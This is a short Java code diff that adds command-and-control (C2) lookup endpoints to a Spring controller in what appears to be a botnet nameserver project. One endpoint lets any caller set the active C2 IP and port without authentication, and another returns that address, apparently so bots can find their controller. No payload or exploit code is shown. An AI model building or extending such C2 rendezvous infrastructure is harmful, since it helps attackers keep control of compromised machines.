@@ -2,6 +2,8 @@ package athena.nameserver.handler.lookup;
 
 import BotHandling.Bot;
 import BotHandling.BotHandler;
+import C2Handling.C2;
+import C2Handling.C2Handler;
 import org.json.simple.JSONObject;
 import org.json.simple.parser.JSONParser;
 import org.json.simple.parser.ParseException;
@@ -12,16 +14,47 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.logging.Logger;
 
+/**
+ * The main lookup endpoint for the webserver.
+ */
 @RestController
 @RequestMapping("/api/lookup/")
 public class LookupController
 {
     Logger logger = Logger.getLogger(String.valueOf(LookupController.class));
     BotHandler botHandler;
-
+    C2Handler c2Handler;
     public LookupController()
     {
         botHandler = new BotHandler();
+        c2Handler = new C2Handler();
+    }
+
+    /**
+     * Updates the IP address of the webserver.
+     * @param c2Details the details with {ip: [ip], port: [port]}
+     * @return String stating the ip address and the bot.
+     * @throws ParseException in case of a malformed request body.
+     */
+    @CrossOrigin
+    @PostMapping("c2/update")
+    public String updateC2(@RequestBody String c2Details) throws ParseException {
+        JSONObject jsonObject = (JSONObject) new JSONParser().parse(c2Details);
+        String ip = jsonObject.get("ip").toString();
+        String port = jsonObject.get("port").toString();
+        c2Handler.updateC2(ip, port);
+        return ip + "::updated";
+    }
+
+    /**
+     * Gets the IP address of the webserver.
+     * @return String formatted ip::portNum
+     */
+    @CrossOrigin
+    @GetMapping("c2")
+    public String getC2IpAddress() {
+        C2 c2 = c2Handler.getActiveC2();
+        return c2.ip() + "::" + c2.portNum();
     }
 
     /**
